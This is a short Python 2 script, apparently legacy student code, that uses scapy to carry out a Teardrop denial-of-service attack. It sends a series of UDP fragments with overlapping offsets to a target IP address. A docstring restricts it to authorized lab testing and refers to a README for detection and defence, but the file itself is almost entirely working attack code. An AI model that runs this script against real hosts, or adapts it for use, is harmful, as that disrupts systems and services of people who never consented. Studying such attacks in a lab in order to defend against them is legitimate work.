#!/usr/bin/env python
"""Teardrop: overlapping-offset fragmentation DoS demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

Note: this is legacy student code kept as an original reference. It was
written for Python 2 and an isolated Linux lab; adapt it to your own
authorized environment before use.
"""

import sys
from scapy.all import *




# Sending multiple fragmented Packets with ovelapped offsets
def TearDrop(Ip,Interface):
    print "The teardrop attack is initiating %s" %Ip
    size=800
    offset=3
    load="\x00"*size
    i=IP()/UDP(dport=80)
    i.dst=Ip
    i.flags="MF"
    i.proto=17
    send(i/load,verbose=0,iface=Interface)

    for k in range(10):
        i.frag=offset
        offset+=20
        send(i/load,verbose=0,iface=Interface)

    i.flags=0
    i.frag=offset
    send(i/load,verbose=0,iface=Interface)

 
    return 007



